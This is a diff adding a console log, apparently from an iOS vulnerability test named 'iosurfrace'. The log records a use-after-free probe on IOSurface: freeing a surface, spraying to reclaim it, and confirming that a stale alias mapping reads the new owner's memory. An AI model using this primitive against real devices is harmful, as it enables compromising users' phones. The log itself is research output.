@@ -1,0 +1,19 @@
+[*] iosurfrace start (entry over a surface; alias dropped before release)
+[*] iosurfrace syms create=0x1dc0d5980 id=0x1dc0d5360 base=0x1dc0d9b20 alloc=0x1dc0d714c mach_vm_map=0x25178b814
+[*] iosurfrace phase0 control base=0x1009f8000 alloc=0x8000
+[*] iosurfrace phase0 after release + spray(64): base_reused=YES idx=0
+[*] iosurfrace surface id=0x76 base=0x1009f8000 alloc=0x8000 marker=0xaaaa0001 rb=0xaaaa0001
+[*] iosurfrace entry(size=0x8000) -> kr=0 (0x0) handle=0x680b
+[*] iosurfrace alias1 -> kr=0 (0x0) at 0x100a00000 marker=0xaaaa0001 same=YES
+[*] iosurfrace alias1 deallocated; no user mapping of the object remains
+[*] iosurfrace surface CFReleased; only the memory entry remains
+[*] iosurfrace spray(64): old base reclaimed=YES idx=0
+[*] iosurfrace alias2(after release) -> kr=0 (0x0) at 0x105a8c000 read=0xaaaa0001
+[*] iosurfrace spray_base_content=0xaaaa0001
+[*] iosurfrace discriminator: wrote 0x77770002 into reclaimed surface, alias now reads 0x77770002 (after control write: 0x77770002)
+[*] iosurfrace VERDICT alias_follows_new_owner=YES marker_intact=no
+[*] iosurfrace rc=0 recycleCtl=1 markerWrote=1 entryKR=0 alias1=1 baseReused=1 verdict=2
+=== iosurfrace done ===
+Waiting for the application to terminate...
+App terminated due to signal 15.
+WARNING: Failed to forward Continued: 19 to remote process: Failed to send signal 19 to process 45,182.
